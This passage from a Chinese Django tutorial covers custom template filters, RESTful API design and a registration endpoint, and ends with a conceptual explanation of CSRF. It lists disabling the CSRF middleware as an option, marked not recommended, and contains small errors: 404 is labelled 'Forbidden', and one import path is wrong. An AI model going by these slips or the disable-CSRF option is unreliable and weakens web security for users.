把上面所有的数学表达式放到HTML表格对应的格子中。如果可以，请实现奇偶行颜色不同。
</p>

<p>
创建模板tag
</p>

<div class="org-src-container">
<pre class="src src-sh">user/
    urls.py
    views.py
    templates/
        filter.html
    templatetags/
        __init__.py
        myfilters.py
</pre>
</div>

<p>
user/templatetags/myfilters.py
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">user/templatetags/myfilters.py</span>
<span style="color: #a020f0;">from</span> django <span style="color: #a020f0;">import</span> template

<span style="color: #a0522d;">register</span> = template.Library()

@register.<span style="color: #483d8b;">filter</span>(name=<span style="color: #8b2252;">"multiply"</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992;&#35013;&#39280;&#22120;&#27880;&#20876; </span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">multiply</span>(a, b): <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21482;&#33021;1&#21040;2&#20010;&#21442;&#25968;</span>
    <span style="color: #a020f0;">return</span> a*b
</pre>
</div>

<p>
user/urls.py
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">user/urls.py</span>
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path
<span style="color: #a020f0;">from</span> .views <span style="color: #a020f0;">import</span> reg, user_login, user_logout, get_captcha, test_filter

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">'login'</span>, user_login, name=<span style="color: #8b2252;">'userlogin'</span>),
    path(<span style="color: #8b2252;">'tf'</span>, test_filter), <span style="color: #b22222;"># </span><span style="color: #b22222;">/users/tf</span>
    path(<span style="color: #8b2252;">'&lt;int:id&gt;'</span>, get_user), <span style="color: #b22222;"># </span><span style="color: #b22222;">/users/2</span>
]
</pre>
</div>

<p>
user/views.py
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">user/views.py</span>
...
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">test_filter</span>(request):
    <span style="color: #a020f0;">return</span> render(request, <span style="color: #8b2252;">'filter.html'</span>, {<span style="color: #8b2252;">'loop'</span>:[1,2,3,4,5,6,7,8,9]})

<span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> reverse
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_user</span>(request, <span style="color: #483d8b;">id</span>):
    <span style="color: #a0522d;">x</span> = reverse(<span style="color: #8b2252;">'userlogin'</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25343;&#21040;url</span>
    <span style="color: #483d8b;">print</span>(x, <span style="color: #483d8b;">type</span>(x), <span style="color: #8b2252;">'+++++++++++'</span>)
    <span style="color: #a020f0;">return</span> render(request, <span style="color: #8b2252;">'filter.html'</span>, {<span style="color: #8b2252;">'loop'</span>:[1,2,3,4,5,6,7,8,9], <span style="color: #8b2252;">'id'</span>:<span style="color: #483d8b;">id</span>, <span style="color: #8b2252;">'login_url'</span>:x})
</pre>
</div>

<p>
定义模板user/templates/filter.html
</p>
<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #a020f0;">!DOCTYPE</span> html&gt;
&lt;<span style="color: #0000ff;">html</span> <span style="color: #a0522d;">lang</span>=<span style="color: #8b2252;">"en"</span>&gt;
&lt;<span style="color: #0000ff;">head</span>&gt;
    &lt;<span style="color: #0000ff;">meta</span> <span style="color: #a0522d;">charset</span>=<span style="color: #8b2252;">"UTF-8"</span>&gt;
    &lt;<span style="color: #0000ff;">title</span>&gt;<span style="font-weight: bold; text-decoration: underline;">Django web &#27169;&#26495;&#25216;&#26415;</span>&lt;/<span style="color: #0000ff;">title</span>&gt;
&lt;/<span style="color: #0000ff;">head</span>&gt;
&lt;<span style="color: #0000ff;">body</span>&gt;
&lt;<span style="color: #0000ff;">a</span> <span style="color: #a0522d;">href</span>=<span style="color: #8b2252;">"{% url 'userlogin' %}"</span>&gt;&#30331;&#24405;&lt;/<span style="color: #0000ff;">a</span>&gt;&lt;<span style="color: #0000ff;">br</span>&gt;
{{ login_url }}
&lt;<span style="color: #0000ff;">br</span>&gt;
&lt;<span style="color: #0000ff;">span</span>&gt;&#20320;&#30340;id&#26159;{{id}}!!&lt;/<span style="color: #0000ff;">span</span>&gt;

&lt;<span style="color: #0000ff;">h3</span>&gt;<span style="font-style: italic; text-decoration: underline;">2&#12289;2&#23618;&#24490;&#29615;&#23454;&#29616; b.&#33258;&#23450;&#20041;&#65288;&#19981;&#25512;&#33616;&#65292;&#26356;&#24212;&#35813;&#22312;python&#20195;&#30721;&#20013;&#23436;&#25104;&#65289;</span>&lt;/<span style="color: #0000ff;">h3</span>&gt;
{% load myfilters %}

+++{{ loop.0|multiply:2}}+++

&lt;<span style="color: #0000ff;">table</span> <span style="color: #a0522d;">border</span>=<span style="color: #8b2252;">"1"</span>&gt;
    {% for i in loop %}
    &lt;<span style="color: #0000ff;">tr</span>&gt;
        {% for j in loop %}
        &lt;<span style="color: #0000ff;">td</span>&gt;{{ i }}*{{ j }}={{i|multiply:j}}&lt;/<span style="color: #0000ff;">td</span>&gt;
        {% endfor %}
    &lt;/<span style="color: #0000ff;">tr</span>&gt;
    {% endfor %}
&lt;/<span style="color: #0000ff;">table</span>&gt;

&lt;<span style="color: #0000ff;">h4</span>&gt;<span style="text-decoration: underline;">&#22855;&#20598;&#34892;&#21464;&#21270;</span>&lt;/<span style="color: #0000ff;">h4</span>&gt;
&lt;<span style="color: #0000ff;">table</span> <span style="color: #a0522d;">border</span>=<span style="color: #8b2252;">"1"</span>&gt;
    {% for i in loop %}
    <span style="color: #b22222;">&lt;!--</span><span style="color: #b22222;">&lt;tr style="color:{{ forloop.counter|divisibleby:2|yesno:'red,green' }}"&gt;</span><span style="color: #b22222;">--&gt;</span>
    &lt;<span style="color: #0000ff;">tr</span> <span style="color: #a0522d;">style</span>=<span style="color: #8b2252;">"color:{% cycle 'red' 'green' 'blue' %}"</span>&gt; <span style="color: #b22222;">&lt;!--</span><span style="color: #b22222;">&#28378;&#21160;&#39068;&#33394;</span><span style="color: #b22222;">--&gt;</span>
        {% for j in loop %}
        <span style="color: #b22222;">&lt;!--</span><span style="color: #b22222;">&lt;td&gt;{{ i }}*{{ j }}={{i|multiply:j}}&lt;/td&gt;</span><span style="color: #b22222;">--&gt;</span>
        &lt;<span style="color: #0000ff;">td</span>&gt;{{ forloop.parentloop.counter }}*{{ forloop.counter }}={{i|multiply:j}}&lt;/<span style="color: #0000ff;">td</span>&gt; <span style="color: #b22222;">&lt;!--</span><span style="color: #b22222;">parentloop &#19978;&#23618;&#24490;&#29615;</span><span style="color: #b22222;">--&gt;</span>
        {% endfor %}
    &lt;/<span style="color: #0000ff;">tr</span>&gt;
    {% endfor %}
&lt;/<span style="color: #0000ff;">table</span>&gt;


&lt;<span style="color: #0000ff;">h3</span>&gt;<span style="font-style: italic; text-decoration: underline;">2&#12289;2&#23618;&#24490;&#29615;&#23454;&#29616; a.widthratio</span>&lt;/<span style="color: #0000ff;">h3</span>&gt;
&lt;<span style="color: #0000ff;">table</span> <span style="color: #a0522d;">border</span>=<span style="color: #8b2252;">"1"</span>&gt;
    {% for i in loop %}
    &lt;<span style="color: #0000ff;">tr</span>&gt;
        {% for j in loop %}
        &lt;<span style="color: #0000ff;">td</span>&gt;{{ i }}*{{ j }}={% widthratio i 1 j %}&lt;/<span style="color: #0000ff;">td</span>&gt;
        {% endfor %}
    &lt;/<span style="color: #0000ff;">tr</span>&gt;
    {% endfor %}
&lt;/<span style="color: #0000ff;">table</span>&gt;

<span style="color: #b22222;">&lt;!--</span>
<span style="color: #b22222;">&lt;h3&gt;</span><span style="color: #b22222; font-style: italic; text-decoration: underline;">1&#12289;&#19968;&#23618;&#24490;&#29615;&#23454;&#29616;</span><span style="color: #b22222;">&lt;/h3&gt;</span>
<span style="color: #b22222;">&lt;table border="1"&gt;</span>

<span style="color: #b22222;">        {% for x in mydict.matrix %}</span>
<span style="color: #b22222;">        {% if forloop.counter0|divisibleby:9 %}</span>
<span style="color: #b22222;">        &lt;tr&gt;</span>
<span style="color: #b22222;">        {% endif %}</span>
<span style="color: #b22222;">        &lt;td&gt;{{ x }}&lt;/td&gt;</span>
<span style="color: #b22222;">        {% if forloop.counter|divisibleby:9 %}</span>
<span style="color: #b22222;">        &lt;/tr&gt;</span>
<span style="color: #b22222;">        {% endif %}</span>
<span style="color: #b22222;">        {% endfor %}</span>
<span style="color: #b22222;">    &lt;/tr&gt;</span>
<span style="color: #b22222;">&lt;/table&gt;</span>
<span style="color: #b22222;">--&gt;</span>
&lt;/<span style="color: #0000ff;">body</span>&gt;
&lt;/<span style="color: #0000ff;">html</span>&gt;
</pre>
</div>

<p>
访问 <a href="http://localhost:8000/users/tf">http://localhost:8000/users/tf</a>  观察效果
</p>

<p>
访问 <a href="http://localhost:8000/users/134">http://localhost:8000/users/134</a> 观察效果
</p>

<p>
参考：
</p>
<ul class="org-ul">
<li>自定义模板: <a href="https://docs.djangoproject.com/en/5.2/howto/custom-template-tags/">https://docs.djangoproject.com/en/5.2/howto/custom-template-tags/</a></li>
<li>url: <a href="https://docs.djangoproject.com/en/5.2/ref/templates/builtins/#url">https://docs.djangoproject.com/en/5.2/ref/templates/builtins/#url</a></li>
</ul>
</div>
</div>
</div>
</section>
<section id="outline-container-h:5507a5c6-5cb6-476a-b1da-aeee85d2c35e" class="outline-2">
<h2 id="h:5507a5c6-5cb6-476a-b1da-aeee85d2c35e">Restful-API设计</h2>
<div class="outline-text-2" id="text-h:5507a5c6-5cb6-476a-b1da-aeee85d2c35e">
<ul class="org-ul">
<li>REST(Representational State Transfer)，表现层状态转移。</li>
<li>它首次出现在2000年Roy Fielding的博士论文中，Roy Fielding是HTTP规范的主要编写者之一。</li>
<li>表现层是资源的表现层，对于网络中的资源就需要URI(Uniform Resource Identiﬁer)来指向。REST指的是资源的状态变化。</li>
</ul>

<p>
注：RESTFul没有标准。
</p>
</div>
<div id="outline-container-h:49af8863-8cc8-445c-b2a6-b98063d63816" class="outline-3">
<h3 id="h:49af8863-8cc8-445c-b2a6-b98063d63816">1.协议</h3>
<div class="outline-text-3" id="text-h:49af8863-8cc8-445c-b2a6-b98063d63816">
<p>
使用HTTP或者HTTPS。对外若有安全性要求，可以使用HTTPS。但是内部服务间调用可以使用HTTP或HTTPS。
</p>
</div>
</div>
<div id="outline-container-h:1acdca45-9360-418e-ad1f-d8a5c6bc3a3e" class="outline-3">
<h3 id="h:1acdca45-9360-418e-ad1f-d8a5c6bc3a3e">2.HTTP方法</h3>
<div class="outline-text-3" id="text-h:1acdca45-9360-418e-ad1f-d8a5c6bc3a3e">
<p>
HTTP请求中的方法表示执行的 <b>动作</b>
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">常用方法(动词)</th>
<th scope="col" class="org-left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">GET</td>
<td class="org-left">获取资源</td>
</tr>

<tr>
<td class="org-left">POST</td>
<td class="org-left">创建新的资源</td>
</tr>

<tr>
<td class="org-left">PUT</td>
<td class="org-left">更新资源</td>
</tr>

<tr>
<td class="org-left">PATCH</td>
<td class="org-left">部分更新资源</td>
</tr>

<tr>
<td class="org-left">DELETE</td>
<td class="org-left">删除资源</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="outline-container-h:77e8fb6d-c20e-4d85-bccd-6e337306b639" class="outline-3">
<h3 id="h:77e8fb6d-c20e-4d85-bccd-6e337306b639">3.使用名称</h3>
<div class="outline-text-3" id="text-h:77e8fb6d-c20e-4d85-bccd-6e337306b639">
<p>
URL指向 <b>资源</b> ，在URL路径的描述中，只需要出现名称，而不要出现动词。动词由HTTP方法提供。
</p>

<p>
不要单复数混用，建议名称使用复数。
</p>

<p>
Restful的核心是资源，URL应该指向资源，所以应该是使用名称表达式，而不是动词表达。
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">方法</th>
<th scope="col" class="org-left">路径</th>
<th scope="col" class="org-left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">GET</td>
<td class="org-left">/posts</td>
<td class="org-left">返回所有文章</td>
</tr>

<tr>
<td class="org-left">GET</td>
<td class="org-left">/posts/10</td>
<td class="org-left">返回id为10的文章</td>
</tr>

<tr>
<td class="org-left">POST</td>
<td class="org-left">/posts</td>
<td class="org-left">创建新的文章</td>
</tr>

<tr>
<td class="org-left">PUT</td>
<td class="org-left">/posts/10</td>
<td class="org-left">更新id为10的文章</td>
</tr>

<tr>
<td class="org-left">DELETE</td>
<td class="org-left">/posts/10</td>
<td class="org-left">删除id为10的文章</td>
</tr>

<tr>
<td class="org-left">PATCH</td>
<td class="org-left">/posts/10</td>
<td class="org-left">部分更新id为10的文章数据</td>
</tr>
</tbody>
</table>

<p>
不要出现如下的访问路径
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#19979;&#21015;&#26041;&#24335;&#19981;&#22909;&#65292;&#20986;&#29616;&#21517;&#35789;&#21644;&#21160;&#20316;&#28151;&#25645;</span>
/getAllPosts
/addPost
/updatePost
/delPost
</pre>
</div>

<p>
GET方法只是获取资源，而不是改变资源状态。改变资源请使用POST,PUT,DELETE等方法。
</p>

<p>
例如：使用 <code>GET /posts/10</code> 就可以获取资源了，但是却使用 <code>Get /posts/10/del</code> 或 <code>GET /posts/10?v=del</code> ,本意是想删除。但这样不好，GET方法请求只为获取资源，不要改变资源状态。
</p>

<p>
子资源的访问
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">方法</th>
<th scope="col" class="org-left">路径Endpoint</th>
<th scope="col" class="org-left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">GET</td>
<td class="org-left">/posts/10/authors</td>
<td class="org-left">返回id为10的文章的所有作者</td>
</tr>

<tr>
<td class="org-left">GET</td>
<td class="org-left">/posts/10/authors/8</td>
<td class="org-left">返回id为10的文章的作者中id为8的</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="outline-container-h:4511c1d3-8530-47ab-8ae0-a32858ba5be6" class="outline-3">
<h3 id="h:4511c1d3-8530-47ab-8ae0-a32858ba5be6">4.集合功能</h3>
<div class="outline-text-3" id="text-h:4511c1d3-8530-47ab-8ae0-a32858ba5be6">
<ul class="org-ul">
<li><p>
过滤Filtering
</p>

<p>
指定过滤条件 <code>GET /posts?tag=python</code>
</p></li>

<li><p>
排序Sorting
</p>

<p>
指定排序条件。有很多种设计风格，例如使用+表示asc，-表示desc。 <code>GET /posts?sort=+title,-id</code> 或者 <code>GET /posts?sort=title_asc,id_desc</code>
</p></li>

<li><p>
分页Pagination
</p>

<p>
一般情况下，查询返回的记录数非常多，必须分页。 <code>GET /posts?page=58&amp;size=20</code>
</p></li>
</ul>
</div>
</div>
<div id="outline-container-h:99dc4087-5906-46a8-bd31-78b68f8ff9e7" class="outline-3">
<h3 id="h:99dc4087-5906-46a8-bd31-78b68f8ff9e7">5.状态码</h3>
<div class="outline-text-3" id="text-h:99dc4087-5906-46a8-bd31-78b68f8ff9e7">
<p>
使用HTTP响应的状态码表示动作的成功与否。
</p>

<p>
2xx表示用户请求服务端成功的处理；4xx表示用户请求的错误；5xx表示服务器端出错了。
</p>

<table>


<colgroup>
<col  class="org-right">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-right">Status Code</th>
<th scope="col" class="org-left">说明</th>
<th scope="col" class="org-left">Method</th>
<th scope="col" class="org-left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-right">200</td>
<td class="org-left">OK</td>
<td class="org-left">GET</td>
<td class="org-left">成功获取资源</td>
</tr>

<tr>
<td class="org-right">201</td>
<td class="org-left">CREATED</td>
<td class="org-left">POST,PUT,PATCH</td>
<td class="org-left">成功创建或修改</td>
</tr>

<tr>
<td class="org-right">204</td>
<td class="org-left">NO CONTENT</td>
<td class="org-left">DELETE</td>
<td class="org-left">成功删除资源</td>
</tr>

<tr>
<td class="org-right">400</td>
<td class="org-left">Bad Request</td>
<td class="org-left">ALL</td>
<td class="org-left">请求中有错误</td>
</tr>

<tr>
<td class="org-right">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">例如：GET时参数有问题，PUT时提交的数据错误等</td>
</tr>

<tr>
<td class="org-right">401</td>
<td class="org-left">Unauthorized</td>
<td class="org-left">ALL</td>
<td class="org-left">权限未通过认证</td>
</tr>

<tr>
<td class="org-right">403</td>
<td class="org-left">Forbidden</td>
<td class="org-left">ALL</td>
<td class="org-left">有无权限都禁止访问该资源</td>
</tr>

<tr>
<td class="org-right">404</td>
<td class="org-left">Forbidden</td>
<td class="org-left">ALL</td>
<td class="org-left">请求资源不存在</td>
</tr>

<tr>
<td class="org-right">405</td>
<td class="org-left">Method Not Allowed</td>
<td class="org-left">ALL</td>
<td class="org-left">方法不允许</td>
</tr>

<tr>
<td class="org-right">500</td>
<td class="org-left">internal Server Error</td>
<td class="org-left">ALL</td>
<td class="org-left">服务器端错误</td>
</tr>
</tbody>
</table>

<p>
详细状态码参考<a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html">https://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html</a>
</p>
</div>
</div>
<div id="outline-container-h:a4f53546-95ed-4a6e-a2f1-4bdbdc67b3e2" class="outline-3">
<h3 id="h:a4f53546-95ed-4a6e-a2f1-4bdbdc67b3e2">6.错误处理</h3>
<div class="outline-text-3" id="text-h:a4f53546-95ed-4a6e-a2f1-4bdbdc67b3e2">
<p>
在Restful API设计中，错误处理也非常重要。单单从无状态码中无法详尽描述错误的信息。
</p>

<ol class="org-ol">
<li><p>
返回消息
</p>

<div class="org-src-container">
<pre class="src src-json">{error:"user NOT Found"}
</pre>
</div></li>

<li><p>
从错误消息中了解到错误号、错误信息、错误描述等信息。甚至更详细的信息可以通过code查阅文档
</p>

<div class="org-src-container">
<pre class="src src-json">{
    "code":10056,
    "message":"Invalid ID",
    "description":"More details"
}
</pre>
</div>

<p>
code 为 0 表示无错误。非0表示有错误，就要看 message 中的错误描述了。
</p></li>
</ol>
</div>
</div>
<div id="outline-container-h:158c39ff-9c3e-46e8-aae9-a1aefd6553cd" class="outline-3">
<h3 id="h:158c39ff-9c3e-46e8-aae9-a1aefd6553cd">7.版本</h3>
<div class="outline-text-3" id="text-h:158c39ff-9c3e-46e8-aae9-a1aefd6553cd">
<p>
在较大项目开发时，由于业务升级，需要对接口调用做出改动，例如请求参数、返回状态码、json数据发生变化等。如果使用同一套接口，在原有接口上直接修改会导致原有调用者调用出问题。解决方法:
</p>
<ol class="org-ol">
<li>完全兼容原有接口，虽然这样做可以，但是很难做到所有接口的完全兼容设计。实在不行的，老的接口保留不动，建立新的API接口以供调用（小规模场景）</li>
<li>对已经发布使用的接口规定版本号访问。新增的、改进的、删除的API重新发布新的版本。项目开发时，指定版本和接口即可。老项目可以不必升级到这个新版本。（大规模）</li>
</ol>

<p>
强烈要求使用版本、版本号使用简单数字，例如v2。
</p>

<p>
2种风格
</p>
<ul class="org-ul">
<li><code>http://api.xdd.com/v1/posts/10</code> 这种风格会跨域，适合较大的项目</li>
<li><code>http://www.xdd.com/api/v1/posts/10</code></li>
</ul>
</div>
</div>
<div id="outline-container-h:c4c86260-2559-4655-8d9e-f636d1505df0" class="outline-3">
<h3 id="h:c4c86260-2559-4655-8d9e-f636d1505df0">8. 返回结果</h3>
<div class="outline-text-3" id="text-h:c4c86260-2559-4655-8d9e-f636d1505df0">
<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">方法</th>
<th scope="col" class="org-left">路径</th>
<th scope="col" class="org-left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">GET</td>
<td class="org-left">/posts</td>
<td class="org-left">返回所有文章的列表</td>
</tr>

<tr>
<td class="org-left">GET</td>
<td class="org-left">/posts/10</td>
<td class="org-left">返回id为10的文章对象</td>
</tr>

<tr>
<td class="org-left">POST</td>
<td class="org-left">/posts</td>
<td class="org-left">创建更新的文章并返回这个对象</td>
</tr>

<tr>
<td class="org-left">PUT</td>
<td class="org-left">/posts/10</td>
<td class="org-left">更新id为10的文章并返回这个对象</td>
</tr>

<tr>
<td class="org-left">DELETE</td>
<td class="org-left">/posts/10</td>
<td class="org-left">删除id为10的文章返回一个空对象</td>
</tr>

<tr>
<td class="org-left">PATCH</td>
<td class="org-left">/posts/10</td>
<td class="org-left">部分更新id为10的文章数据并返回这个对象</td>
</tr>
</tbody>
</table>

<p>
<b>返回数据一律采用JSON格式</b>
</p>
</div>
</div>
</section>
<section id="outline-container-h:d4c1ba92-5f0c-4b3a-899f-7873c7cd467a" class="outline-2">
<h2 id="h:d4c1ba92-5f0c-4b3a-899f-7873c7cd467a">注册接口设计和实现</h2>
<div class="outline-text-2" id="text-h:d4c1ba92-5f0c-4b3a-899f-7873c7cd467a">
<ul class="org-ul">
<li>提供用户注册处理</li>
<li>提供用户登录处理</li>
<li>提供路由配置</li>
</ul>
</div>
<div id="outline-container-h:dfda6f78-6fe5-4735-a5f4-c5b7f812762b" class="outline-3">
<h3 id="h:dfda6f78-6fe5-4735-a5f4-c5b7f812762b">用户注册接口设计</h3>
<div class="outline-text-3" id="text-h:dfda6f78-6fe5-4735-a5f4-c5b7f812762b">
<p>
注册功能
</p>
<ul class="org-ul">
<li>前端POST <i>users</i> 带上数据，放到后台服务程序，路由，映射给view函数处理，提交到数据库。</li>
<li>返回JsonResponse  json数据到浏览器端</li>
<li>注册成功，
<ul class="org-ul">
<li>方案1 直接登录；</li>
<li>方案2 返回登录页;</li>
<li>方案3 返回登录页，但需要邮箱激活。</li>
</ul></li>
</ul>


<p>
接收用户通过Post方法提交的注册信息，提交的数据是JSON格式数据。
</p>

<p>
检查用户名是否存在与数据库表中，如果存在返回错误号。如果不存在，将用户提交的数据存入表中。
</p>

<p>
整个过程都采用AJAX异步过程，用户提交JSON数据，服务端获取数据后处理，返回JSON。
</p>

<div class="org-src-container">
<pre class="src src-text">POST /users/ &#21019;&#24314;&#29992;&#25143;

&#35831;&#27714;&#20307; application/json
{
    "password":"string",
    "username":"string",
    "email":"string"
}

&#21709;&#24212;
201 &#21019;&#24314;&#25104;&#21151;
200 &#35831;&#27714;&#25968;&#25454;&#38169;&#35823;&#65292;&#36820;&#22238;&#38169;&#35823;&#21495;&#21644;&#25551;&#36848;
</pre>
</div>

<p>
注意：我们采用自定义状态码，返回状态码可以200，主要还是看返回json中错误码来确定。
</p>
</div>
<div id="outline-container-h:1a518a1d-5758-4380-b733-81e81c017706" class="outline-4">
<h4 id="h:1a518a1d-5758-4380-b733-81e81c017706">路由配置</h4>
<div class="outline-text-4" id="text-h:1a518a1d-5758-4380-b733-81e81c017706">
<p>
为了避免项目中的urls.py条目过多，也为了让应用自己管理路由，采用多级路由
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">blog/urls.py&#25991;&#20214;</span>
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path, include

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">'admin/'</span>, admin.site.urls),
    path(<span style="color: #8b2252;">''</span>,index),
    <span style="color: #b22222;">#</span><span style="color: #b22222;">path('index',index), # index &#37117;&#21487;&#20197;&#21305;&#37197;&#65307;index/&#19981;&#33021;&#21305;&#37197;</span>
    path(<span style="color: #8b2252;">'index/'</span>,index), <span style="color: #b22222;"># </span><span style="color: #b22222;">index index/ &#37117;&#21487;&#20197;&#21305;&#37197;&#65307;index/a&#19981;&#33021;&#21305;&#37197;</span>
    path(<span style="color: #8b2252;">'test/&lt;username&gt;/&lt;int:id&gt;'</span>, test), <span style="color: #b22222;"># </span><span style="color: #b22222;">/test/tom/2 &#23454;&#21442;&#27880;&#20837;</span>
    path(<span style="color: #8b2252;">'users/'</span>,include(<span style="color: #8b2252;">"user.urls"</span>)),  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#23545;/users/xxx&#30340;&#35775;&#38382;&#22312;user.urls.py&#20013;&#35774;&#32622;</span>
]
<span style="color: #b22222;"># </span><span style="color: #b22222;">path &#31532;&#19968;&#20010;&#21442;&#25968;&#23383;&#31526;&#20018; --&gt; regexp; &#31532;&#20108;&#20010;&#21442;&#25968;  &#20989;&#25968;&#12289;include&#36820;&#22238;&#30340;&#32467;&#26524;</span>
</pre>
</div>

<p>
include函数参数写 <code>应用.路由模块</code> ，返回元组。
</p>

<p>
path函数第二个参数可以是可调用对象，或是无组或列表。
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#26032;&#24314;user/uls.py</span>
<span style="color: #a020f0;">from</span> django.conf.urls <span style="color: #a020f0;">import</span> path, include
<span style="color: #a020f0;">from</span> .views <span style="color: #a020f0;">import</span> reg

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35201;&#21435;&#25481;&#21069;&#32512;/users</span>
<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">''</span>,reg), <span style="color: #b22222;">#</span><span style="color: #b22222;">/users/</span>
]
</pre>
</div>


<p>
在 user/views.py 中编写 <b>视图函数reg</b>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#22312; user/views.py &#25991;&#20214;&#20013;&#28155;&#21152;reg&#26041;&#27861;</span>
<span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse,HttpRequest

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">reg</span>(request:HttpRequest):
    <span style="color: #a020f0;">return</span> HttpResponse(<span style="color: #8b2252;">"user.reg"</span>)
</pre>
</div>

<p>
浏览器中输入 <a href="http://127.0.0.1:8000/users/">http://127.0.0.1:8000/users/</a> 测试(这是GET请求),可以看到响应的数据。下面开始完善视图函数。
</p>
</div>
</div>
<div id="outline-container-h:d28b5cb8-02b1-4e07-b28e-2d740c16cfd6" class="outline-4">
<h4 id="h:d28b5cb8-02b1-4e07-b28e-2d740c16cfd6">测试JSON数据</h4>
<div class="outline-text-4" id="text-h:d28b5cb8-02b1-4e07-b28e-2d740c16cfd6">
<p>
使用POST方法，提交数据类型为application/json，json字符串要使用 <b>双引号</b> 。
</p>

<p>
这个数据是注册用的，由客户端提交。
</p>

<p>
数据提交模板为：
</p>

<div class="org-src-container">
<pre class="src src-json">{
    "username":"xdd",
    "password":"abc",
    "email":"xdd@xdd.com"
}
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">curl --location <span style="color: #8b2252;">'http://127.0.0.1:8000/users/'</span> <span style="color: #8b2252;">\</span>
--header <span style="color: #8b2252;">'Content-Type: application/json'</span> <span style="color: #8b2252;">\</span>
--data-raw <span style="color: #8b2252;">'{</span>
<span style="color: #8b2252;">    "username":"xdd",</span>
<span style="color: #8b2252;">    "password":"abc",</span>
<span style="color: #8b2252;">    "email":"xdd@xdd.com"</span>
<span style="color: #8b2252;">}</span>
<span style="color: #8b2252;">'</span>
</pre>
</div>

<p>
也可以使用<a href="https://www.postman.com/">Postman</a>软件测试。返回403 
</p>
<ul class="org-ul">
<li>Body &#x2013;&gt; raw 填写json内容</li>
<li>Body &#x2013;&gt; JSON</li>
</ul>

<p>
403原因
</p>
<ul class="org-ul">
<li>settings.py中 'django.middleware.csrf.CsrfViewMiddleware'
<ul class="org-ul">
<li>如果你使用post方法提交的时候要求从安全角度考虑，必须提供csrftoken进行验证，否则该中间件拒绝你的请求。403</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-h:f5311f9b-8545-4029-a844-8a6b96ffe528" class="outline-4">
<h4 id="h:f5311f9b-8545-4029-a844-8a6b96ffe528">CSRF处理**</h4>
<div class="outline-text-4" id="text-h:f5311f9b-8545-4029-a844-8a6b96ffe528">
<p>
在Post数据的时候，发现出现了下面的提示
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">Forbidden</span> (403)
CSRF verification failed. Request aborted.
</pre>
</div>

<p>
原因： <b>默认Django CsrfViewMiddleware中间件会对所有POST方法提交的信息做CSRF校验</b> 。
</p>

<p>
CSRF或XSRF(Cross-site Request Forgery),即跨站请求伪造。它也被称为：one click attack/session riding。是一种对网站的恶意利用。它伪造成来自受信任用户发起的请求，难以防范。
</p>

<p>
原理： 
</p>
<ol class="org-ol">
<li>用户登录某网站A完成登录认证，网站返回敏感信息的Cookie,即使是会话级的Cookie</li>
<li>用户没有关闭浏览器，或认证的Cookie一段时间内不过期还持久化了，用户就访问攻击网站B</li>
<li>攻击网站B看似一切正常，但是某些页面里面有一些隐藏运行的代码，或者诱骗用户操作的按钮等</li>
<li>这些代码一旦运行就是悄悄地向网站A发起特殊请求，由于网站A的Cookie还有效，且访问的是网站A，则其Cookie就可以一并发给网站A</li>
<li>网站A看到这些Cookie就只能认为是登录用户发起的合理合法请求，就会执行</li>
</ol>

<p>
CSRF解决
</p>
<ol class="org-ol">
<li><p>
关闭CSRF中间件(不推荐)
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">blog/settings.py</span>
